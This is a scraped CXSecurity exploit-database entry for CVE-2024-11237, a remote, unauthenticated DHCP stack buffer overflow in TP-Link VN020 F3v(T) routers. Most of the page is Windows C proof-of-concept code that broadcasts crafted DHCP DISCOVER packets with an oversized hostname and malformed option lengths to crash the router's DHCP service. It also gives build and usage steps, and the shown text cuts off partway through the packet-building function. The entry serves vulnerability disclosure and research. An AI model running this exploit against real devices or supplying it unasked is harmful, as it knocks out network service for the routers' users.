---
title: TP-Link VN020 F3v(T) TT_V6.2.1021) DHCP Stack Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2025050031
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-14
fetch_date: 2025-10-06T22:23:55.727075
---

# TP-Link VN020 F3v(T) TT_V6.2.1021) DHCP Stack Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **TP-Link VN020 F3v(T) TT\_V6.2.1021) DHCP Stack Buffer Overflow** **2025.05.13**  Credit:  **[Mohamed Maatallah](https://cxsecurity.com/author/Mohamed%2BMaatallah/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-11237](https://cxsecurity.com/cveshow/CVE-2024-11237/ "Click to see CVE-2024-11237")**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

/\*
\* Exploit Title: TP-Link VN020 F3v(T) TT\_V6.2.1021) - DHCP Stack Buffer Overflow
\* Date: 10/20/2024
\* Exploit Author: Mohamed Maatallah
\* Vendor Homepage: https://www.tp-link.com
\* Version: TT\_V6.2.1021 (VN020-F3v(T))
\* Tested on: VN020-F3v(T) Router (Hardware Version 1.0)
\* CVE: CVE-2024-11237
\* Category: Remote
\* Technical Details:
\* -----------------
\* - Triggers multiple memory corruption vectors in DHCP parsing
\* - Primary vector: Stack overflow via oversized hostname (127 bytes)
\* - Secondary vector: Parser confusion via malformed length fields
\* - Tertiary vector: Vendor specific option parsing edge case
\*
\* Attack Surface:
\* --------------
\* - DHCP service running on port 67
\* - Processes broadcast DISCOVER packets
\* - No authentication required
\* - Affects all routers running VN020 F3v(t) specifically the ones
\* supplied by Tunisie Telecom & Topnet
\*
\* Exploitation Method:
\* ------------------
\* 1. Sends crafted DHCP DISCOVER packet
\* 2. Overflows hostname buffer (64 -> 127 bytes)
\* 3. Corrupts length fields in DHCP options
\* 4. Success = No response (service crash)
\*
\* Build:
\* ------
\* Windows: cl poc.c /o tplink\_dhcp.exe or use visual studio directly.
\*
\* Usage:
\* ------
\* tplink\_dhcp.exe
#define \_WINSOCK\_DEPRECATED\_NO\_WARNINGS
#include <Ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#pragma comment(lib, "ws2\_32.lib")
// Standard DHCP ports - Server listens on 67, clients send from 68
#define DHCP\_SERVER\_PORT 67
#define DHCP\_CLIENT\_PORT 68
#define MAX\_PACKET\_SIZE 1024 // Maximum size for DHCP packet
#define MAX\_ATTEMPTS 3
// Forward declarations of functions
void create\_dhcp\_discover\_packet(unsigned char\* packet, int\* packet\_length);
void add\_option(unsigned char\* packet, int\* offset, unsigned char option,
unsigned char length, unsigned char\* data);
void tp\_link(unsigned char\* packet, int\* offset);
void print\_packet\_hex(unsigned char\* packet, int length);
int wait\_for\_response(SOCKET sock, int timeout);
int main() {
WSADATA wsa;
SOCKET sock;
struct sockaddr\_in dest;
unsigned char packet[MAX\_PACKET\_SIZE]; // Buffer for DHCP packet
int packet\_length = 0; // Length of constructed packet
int attempts = 0; // Counter for send attempts
int success = 0;
printf("[TP-Thumper] Initializing Winsock...\n");
if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
printf("[TP-Thumper] Winsock initialization failed. Error: %d\n",
WSAGetLastError());
return 1;
}
sock = socket(AF\_INET, SOCK\_DGRAM, IPPROTO\_UDP);
if (sock == INVALID\_SOCKET) {
printf("[TP-Thumper] Could not create socket. Error: %d\n",
WSAGetLastError());
WSACleanup();
return 1;
}
// Set up broadcast address (255.255.255.255)
dest.sin\_family = AF\_INET;
dest.sin\_port = htons(DHCP\_SERVER\_PORT);
dest.sin\_addr.s\_addr = inet\_addr("255.255.255.255");
// Enable broadcast mode on socket
BOOL broadcast = TRUE;
if (setsockopt(sock, SOL\_SOCKET, SO\_BROADCAST, (char\*)&broadcast,
sizeof(broadcast)) < 0) {
printf("[TP-Thumper] Broadcast mode failed.\n");
closesocket(sock);
WSACleanup();
return 1;
}
srand((unsigned int)time(NULL));
// Create the DHCP DISCOVER packet
create\_dhcp\_discover\_packet(packet, &packet\_length);
// Main attempt loop - tries to send packet MAX\_ATTEMPTS times
while (attempts < MAX\_ATTEMPTS && !success) {
printf("[TP-Thumper] Sending DHCP Discover packet (Attempt %d/%d)...\n",
attempts + 1, MAX\_ATTEMPTS);
print\_packet\_hex(packet, packet\_length); //debug
// Send the packet
if (sendto(sock, (char\*)packet, packet\_length, 0, (struct sockaddr\*)&dest,
sizeof(dest)) < 0) {
printf("[TP-Thumper] Packet send failed. Error: %d\n", WSAGetLastError());
}
else {
printf("[TP-Thumper] Packet sent. Waiting for router response...\n");
if (wait\_for\_response(sock, 10)) {
printf(
"[TP-Thumper] Router responded! Exploit may not have succeeded.\n");
success = 1;
}
else {
printf("[TP-Thumper] No response received within timeout.\n");
}
}
attempts++;
}
if (!success) {
printf(
"[TP-Thumper] Exploit succeeded: No router response after %d "
"attempts.\n",
MAX\_ATTEMPTS);
}
else {
printf("[TP-Thumper] Exploit failed: Router responded within timeout.\n");
}
// Cleanup
closesocket(sock);
WSACleanup();
return 0;
}
/\*
\* DHCP Message Format:
\* [0x00]: op = 0x01 ; BOOTREQUEST
\* [0x01]: htype = 0x01 ; Ethernet
\* [0x02]: hlen = 0x06 ; MAC addr len
\* [0x03]: hops = 0x00 ; No relay
\* [0x04-0x07]: xid ; Random transaction ID
\* [0x08-0x0F]: secs + flags ; Broadcast flags set
\* [0x10-0x1F]: ciaddr + yiaddr ; Empty
\* [0x20-0x27]: siaddr + giaddr ; Empty
\* [0x28-0x2D]: chaddr ; Crafted MAC
\*/
void create\_dhcp\_discover\_packet(unsigned char\* packet, int\* packet\_length) {
memset(packet, 0, MAX\_PACKET\_SIZE);
int offset = 0;
// DHCP Header - Standard fields
packet[offset++] = 0x01; // BOOTREQUEST
packet[offset++] = 0x01; // Ethernet
packet[offset++] = 0x06; // MAC len
packet[offset++] = 0x00; // No hops
// ; XID - rand() used for bypass of response filtering
// ; mov eax, rand()
// ; mov [packet + 4], eax
unsigned int xid = (unsigned int)rand();
\*((unsigned int\*)&packet[offset]) = htonl(xid);
offset += 4;
// ; Flags - Set broadcast bit to force response
// ; mov word [packet + 8], 0x0000 ; secs elapsed
// ; mov word [packet + 10], 0x8000 ; broadcast flag
packet[offset++] = 0x00;
packet[offset++] = 0x00;
packet[offset++] = 0x80;
packet[offset++] = 0x00;
// Zero IP fields - forces DHCP server parse
memset(&packet[offset], 0, 16);
offset += 16;
// ; Crafted MAC - DE:AD:BE:EF:00:01
// ; Used for unique client tracking, bypasses MAC filters
packet[offset++] = 0xDE;
packet[offset++] = 0xAD;...